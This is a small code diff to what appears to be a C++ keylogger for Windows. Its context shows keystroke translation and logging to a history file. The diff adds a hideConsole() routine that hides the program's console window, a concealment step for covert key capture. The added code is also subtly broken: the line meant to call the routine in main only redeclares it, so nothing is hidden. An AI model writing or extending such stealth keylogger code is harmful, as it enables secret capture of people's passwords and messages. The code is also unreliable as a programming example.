@@ -13,9 +13,12 @@ ofstream logHistory;
 //void Stealth();
 string translateKey(int keyStroke);
 void logKey(string keyStroke);
+void hideConsole();
 
 int main()
 {
+    void hideConsole();
+    
     enum Status { disable, enable };
     Status log = enable;
 
@@ -307,4 +310,9 @@ string translateKey(int keyStroke)
         }
     }
     return key;
+}
+void hideConsole()
+{
+    HWND myConsole = GetConsoleWindow();
+    ShowWindow(myConsole, 0);
 }
